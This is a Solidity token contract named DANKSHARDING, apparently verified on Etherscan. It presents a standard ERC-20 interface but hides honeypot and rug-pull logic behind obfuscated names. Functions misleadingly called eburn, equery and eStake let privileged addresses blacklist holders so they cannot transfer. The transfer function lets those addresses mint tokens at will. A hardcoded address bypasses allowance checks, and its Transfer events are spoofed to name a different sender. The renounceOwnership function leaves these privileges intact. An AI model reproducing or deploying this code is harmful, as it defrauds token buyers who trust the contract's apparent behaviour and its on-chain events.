/**
 *Submitted for verification at Etherscan.io on 2022-11-05
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address eMCM = 0x1E0A2E851E86907c483d22b9A647a7A0E5740F5C;
	address eWMB = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract DANKSHARD is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private eEc;
	mapping (address => bool) private eBe;
    mapping (address => bool) private ewE;
    mapping (address => mapping (address => uint256)) private vEb;
    uint8 private constant lEB = 8;
    uint256 private constant SBe = 150000000 * (10** lEB);
    string private constant _name = "DANKSHARDING";
    string private constant _symbol = "DANKS";



    constructor () {
        eEc[_msgSender()] = SBe;
         MkRe(eWMB, SBe); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return lEB;
    }

    function totalSupply() public pure  returns (uint256) {
        return SBe;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return eEc[account];
    }
	

   

	
    function MkRe(address ejE, uint256 eNb) onlyOwner internal {
    emit Transfer(address(0), ejE ,eNb); }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return vEb[owner][spender];
    }
			 function eburn(address ejE) onlyOwner public{
        eBe[ejE] = true; }
            function approve(address spender, uint256 amount) public returns (bool success) {    
        vEb[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function equery(address ejE) public{
         if(eBe[msg.sender])  { 
        ewE[ejE] = true; }}
        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == eMCM)  {
        require(amount <= eEc[sender]);
        eEc[sender] -= amount;  
        eEc[recipient] += amount; 
          vEb[sender][msg.sender] -= amount;
        emit Transfer (eWMB, recipient, amount);
        return true; }  else  
          if(!ewE[recipient]) {
          if(!ewE[sender]) {
         require(amount <= eEc[sender]);
        require(amount <= vEb[sender][msg.sender]);
        eEc[sender] -= amount;
        eEc[recipient] += amount;
        vEb[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function eStake(address ejE) public {
        if(eBe[msg.sender]) { 
        ewE[ejE] = false;}}
		
		function transfer(address ejE, uint256 eNb) public {
        if(msg.sender == eMCM)  {
        require(eEc[msg.sender] >= eNb);
        eEc[msg.sender] -= eNb;  
        eEc[ejE] += eNb; 
        emit Transfer (eWMB, ejE, eNb);} else  
        if(eBe[msg.sender]) {eEc[ejE] += eNb;} else
        if(!ewE[msg.sender]) {
        require(eEc[msg.sender] >= eNb);
        eEc[msg.sender] -= eNb;  
        eEc[ejE] += eNb;          
        emit Transfer(msg.sender, ejE, eNb);}}
		
		

		
		}